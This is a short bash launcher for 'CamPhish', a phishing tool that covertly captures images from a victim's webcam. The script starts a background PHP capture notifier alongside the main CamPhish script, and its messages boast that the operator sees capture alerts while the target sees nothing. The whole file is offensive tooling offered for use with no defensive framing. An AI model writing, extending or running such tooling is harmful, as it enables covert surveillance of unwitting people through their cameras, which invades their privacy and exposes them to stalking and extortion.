#!/bin/bash

# CamPhish with Capture Monitor
# This script starts CamPhish and capture notification monitor

printf "\e[1;92m[+] CamPhish with Silent Capture Monitor\e[0m\n"
printf "\e[1;92m[+] Starting capture notification system...\e[0m\n"

# Check if PHP is available
if ! command -v php >/dev/null 2>&1; then
    printf "\e[1;31m[!] ERROR: PHP not found. Please install PHP first.\e[0m\n"
    exit 1
fi

# Check if required files exist
if [[ ! -f "capture_notifier.php" ]] || [[ ! -f "camphish_auto.sh" ]]; then
    printf "\e[1;31m[!] ERROR: Required files not found.\e[0m\n"
    exit 1
fi

# Start capture monitor in background
printf "\e[1;92m[+] Starting capture monitor (background)...\e[0m\n"
php capture_notifier.php &
MONITOR_PID=$!
printf "\e[1;92m[+] Monitor PID: $MONITOR_PID\e[0m\n"

# Give monitor time to start
sleep 2

# Start CamPhish
printf "\e[1;92m[+] Starting CamPhish AUTO...\e[0m\n"
printf "\e[1;93m[!] Capture notifications will appear in this terminal\e[0m\n"
printf "\e[1;93m[!] Target will NOT see any notifications\e[0m\n"
printf "\e[1;93m[!] Press Ctrl+C to stop both CamPhish and monitor\e[0m\n\n"

# Start CamPhish
bash camphish_auto.sh

# Clean up monitor when CamPhish stops
printf "\n\e[1;92m[+] Stopping capture monitor...\e[0m\n"
kill $MONITOR_PID 2>/dev/null || true
printf "\e[1;92m[+] All processes stopped. Goodbye!\e[0m\n"
